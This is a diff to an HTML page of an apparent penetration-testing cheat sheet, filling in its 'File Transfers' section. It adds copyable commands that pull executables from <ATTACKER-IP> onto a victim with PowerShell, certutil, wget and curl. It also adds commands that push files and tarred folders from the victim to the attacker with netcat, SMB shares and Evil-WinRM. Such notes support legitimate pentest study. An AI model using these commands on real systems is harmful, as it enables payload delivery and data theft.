@@ -65,12 +65,10 @@
 
     <a href="pivoting.html">🔀 Pivoting</a>
     <a href="ad-enumeration.html">🧩 AD Enumeration</a>
+  <a href="ad-attacks.html">⚔️ AD Attacks I</a>
+    <a href="ad-attacks2.html">⚔️ AD Attacks II</a>
 
-    <a href="ad-attacks.html">⚔️ AD Attacks</a>
-
-    <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
-
-    <a href="cloud-security.html">☁️ Cloud</a>
+  <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
 
   </nav>
 
@@ -91,63 +89,147 @@
     <!-- TITLE -->
     <div class="section">
       <h1>File Transfers</h1>
-      <p>
-        No exploit survives without file transfer.<br>
-        If you can move files, you can escalate.
-      </p>
     </div>
-
-    <!-- METHODS -->
     <div class="section">
-      <h2>RDP Shared Folder</h2>
-    </div>
+  <h2>HTTP</h2>
 
-    <div class="section">
-      <h2>Impacket File Transfer Tools</h2>
-    </div>
+  <p>Start a simple HTTP server on the attacker machine.</p>
+  <pre>
+<code>python3 -m http.server &lt;ATTACKER-PORT&gt;</code>
+<button class="copy-btn" data-copy="python3 -m http.server <ATTACKER-PORT>">COPY</button>
+  </pre>
 
-    <div class="section">
-      <h2>FTP File Transfer</h2>
-    </div>
+  <p>Download a file from the attacker using PowerShell WebClient.</p>
+  <pre>
+<code>(New-Object System.Net.WebClient).DownloadFile('http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe','C:\Temp\file.exe')</code>
+<button class="copy-btn" data-copy="(New-Object System.Net.WebClient).DownloadFile('http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe','C:\Temp\file.exe')">COPY</button>
+  </pre>
 
-    <div class="section">
-      <h2>SMB File Transfer</h2>
-    </div>
+  <p>Download a file using Invoke-WebRequest.</p>
+  <pre>
+<code>Invoke-WebRequest http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe -OutFile file.exe</code>
+<button class="copy-btn" data-copy="Invoke-WebRequest http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe -OutFile file.exe">COPY</button>
+  </pre>
 
-    <div class="section">
-      <h2>HTTP File Transfer</h2>
-    </div>
+  <p>Download a file using certutil.</p>
+  <pre>
+<code>certutil -urlcache -split -f http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe</code>
+<button class="copy-btn" data-copy="certutil -urlcache -split -f http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe">COPY</button>
+  </pre>
+</div>
 
-    <div class="section">
-      <h2>PHP-Based File Transfer</h2>
-    </div>
+<div class="section">
+  <h2>Evil-WinRM and Impacket</h2>
 
-    <div class="section">
-      <h2>Netcat File Transfer</h2>
-    </div>
+  <p>Download a file from the victim.</p>
+  <pre>
+<code>download file.exe C:\Temp\file.exe</code>
+<button class="copy-btn" data-copy="download file.exe C:\Temp\file.exe">COPY</button>
+  </pre>
 
-    <div class="section">
-      <h2>Base64 File Transfer</h2>
-    </div>
+  <p>Upload a file to the victim.</p>
+  <pre>
+<code>upload file.exe C:\Temp\file.exe</code>
+<button class="copy-btn" data-copy="upload file.exe C:\Temp\file.exe">COPY</button>
+  </pre>
 
-    <!-- STRATEGY -->
-    <div class="section">
-      <h2>Choosing the Right Transfer Method</h2>
-      <ul>
-        <li>Outbound restrictions</li>
-        <li>Available binaries</li>
-        <li>AV and EDR considerations</li>
-      </ul>
-    </div>
+  <p>Download a file using an Impacket interactive shell.</p>
+  <pre>
+<code>lget file.exe</code>
+<button class="copy-btn" data-copy="lget file.exe">COPY</button>
+  </pre>
 
-    <div class="section">
-      <h2>Stealth and Reliability</h2>
-      <ul>
-        <li>Chunked transfers</li>
-        <li>Living-off-the-land binaries</li>
-        <li>Fallback methods</li>
-      </ul>
-    </div>
+  <p>Upload a file using an Impacket interactive shell.</p>
+  <pre>
+<code>lput file.exe</code>
+<button class="copy-btn" data-copy="lput file.exe">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>SMB</h2>
+
+  <p>Create an SMB share on the attacker machine.</p>
+  <pre>
+<code>impacket-smbserver share . -smb2support -username user -password pass</code>
+<button class="copy-btn" data-copy="impacket-smbserver share . -smb2support -username user -password pass">COPY</button>
+  </pre>
+
+  <p>Map the SMB share on the victim machine.</p>
+  <pre>
+<code>net use Z: \\&lt;ATTACKER-IP&gt;\share /user:user pass</code>
+<button class="copy-btn" data-copy="net use Z: \\<ATTACKER-IP>\share /user:user pass">COPY</button>
+  </pre>
+
+  <p>Copy a file from the SMB share.</p>
+  <pre>
+<code>copy Z:\file.exe C:\Temp\file.exe</code>
+<button class="copy-btn" data-copy="copy Z:\file.exe C:\Temp\file.exe">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>Netcat</h2>
+
+  <p>Receive a file on the attacker machine.</p>
+  <pre>
+<code>nc -lvp &lt;ATTACKER-PORT&gt; &gt; file.exe</code>
+<button class="copy-btn" data-copy="nc -lvp <ATTACKER-PORT> > file.exe">COPY</button>
+  </pre>
+
+  <p>Send a file from the victim machine.</p>
+  <pre>
+<code>nc &lt;ATTACKER-IP&gt; &lt;ATTACKER-PORT&gt; &lt; file.exe</code>
+<button class="copy-btn" data-copy="nc <ATTACKER-IP> <ATTACKER-PORT> < file.exe">COPY</button>
+  </pre>
+
+  <p>Send a compressed directory.</p>
+  <pre>
+<code>tar czvf - folder | nc &lt;ATTACKER-IP&gt; &lt;ATTACKER-PORT&gt;</code>
+<button class="copy-btn" data-copy="tar czvf - folder | nc <ATTACKER-IP> <ATTACKER-PORT>">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>Wget and Curl</h2>
+
+  <p>Download a file using wget.</p>
+  <pre>
+<code>wget http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe</code>
+<button class="copy-btn" data-copy="wget http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe">COPY</button>
+  </pre>
+
+  <p>Download a file using curl.</p>
+  <pre>
+<code>curl -O http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe</code>
+<button class="copy-btn" data-copy="curl -O http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe">COPY</button>
+  </pre>
+
+  <p>Download a file using curl on Windows.</p>
+  <pre>
+<code>curl http://&lt;ATTACKER-IP&gt;:&lt;ATTACKER-PORT&gt;/file.exe -o C:\Temp\file.exe</code>
+<button class="copy-btn" data-copy="curl http://<ATTACKER-IP>:<ATTACKER-PORT>/file.exe -o C:\Temp\file.exe">COPY</button>
+  </pre>
+</div>
+
+<div class="section">
+  <h2>Base64</h2>
+
+  <p>Encode a file using Base64.</p>
+  <pre>
+<code>base64 file.exe</code>
+<button class="copy-btn" data-copy="base64 file.exe">COPY</button>
+  </pre>
+
+  <p>Decode a Base64 string back to a file.</p>
+  <pre>
+<code>echo BASE64_STRING | base64 -d &gt; file.exe</code>
+<button class="copy-btn" data-copy="echo BASE64_STRING | base64 -d > file.exe">COPY</button>
+  </pre>
+</div>
+
+
+
 
   </div>
 </main>
